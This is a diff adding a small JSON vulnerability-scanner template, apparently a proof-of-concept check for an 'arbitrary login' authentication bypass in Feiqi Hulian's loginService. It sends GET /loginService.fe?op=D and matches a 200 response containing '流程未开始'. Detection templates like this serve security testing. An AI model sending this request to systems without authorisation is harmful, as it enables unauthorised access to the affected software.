@@ -1,0 +1,14 @@
+{
+	"name":"⻜企互联loginService任意登录",
+	"tag":"feiqihulian",
+	"type":"other",
+	"poc":{
+		"pocGet":"/loginService.fe?op=D",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(流程未开始)"
+	}
+}
